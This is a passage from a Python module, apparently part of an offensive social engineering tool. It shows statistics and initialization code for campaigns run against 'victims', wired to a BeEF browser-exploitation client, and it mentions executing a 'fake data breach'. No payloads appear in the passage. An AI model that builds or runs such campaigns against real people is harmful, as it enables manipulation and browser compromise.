            logger.error(f"Error executing fake data breach: {e}")
            return {"success": False, "error": str(e)}

    def get_campaign_statistics(self) -> Dict[str, Any]:
        """Get campaign statistics"""
        try:
            total_campaigns = len(self.campaigns)
            active_sessions = len(self.active_sessions)
            total_executions = len(self.execution_history)

            # Campaign success rates
            campaign_stats = {}
            for campaign_id, campaign in self.campaigns.items():
                campaign_stats[campaign_id] = {
                    "name": campaign.name,
                    "total_executions": campaign.total_executions,
                    "successful_executions": campaign.successful_executions,
                    "success_rate": campaign.success_rate
                }

            return {
                "total_campaigns": total_campaigns,
                "active_sessions": active_sessions,
                "total_executions": total_executions,
                "campaign_statistics": campaign_stats,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting campaign statistics: {e}")
            return {"error": "Failed to get statistics"}

    def get_available_campaigns(self) -> List[Dict[str, Any]]:
        """Get available campaigns"""
        try:
            return [campaign.to_dict() for campaign in self.campaigns.values()]

        except Exception as e:
            logger.error(f"Error getting available campaigns: {e}")
            return []

# Global social engineering engine instance
social_engineering_engine = None

def initialize_social_engineering_engine(mongodb_connection=None, redis_client=None, beef_client=None) -> SocialEngineeringEngine:
    """Initialize global social engineering engine"""
    global social_engineering_engine
    social_engineering_engine = SocialEngineeringEngine(mongodb_connection, redis_client, beef_client)
    return social_engineering_engine

def get_social_engineering_engine() -> SocialEngineeringEngine:
    """Get global social engineering engine"""
    if social_engineering_engine is None:
        raise ValueError("Social engineering engine not initialized")
    return social_engineering_engine

# Convenience functions
def execute_campaign(campaign_id: str, victim_id: str, session_id: str, victim_profile: Dict[str, Any] = None) -> str:
    """Execute campaign (global convenience function)"""
    return get_social_engineering_engine().execute_campaign(campaign_id, victim_id, session_id, victim_profile)

def get_campaign_statistics() -> Dict[str, Any]:
    """Get campaign statistics (global convenience function)"""
    return get_social_engineering_engine().get_campaign_statistics()

def get_available_campaigns() -> List[Dict[str, Any]]:
    """Get available campaigns (global convenience function)"""
    return get_social_engineering_engine().get_available_campaigns()
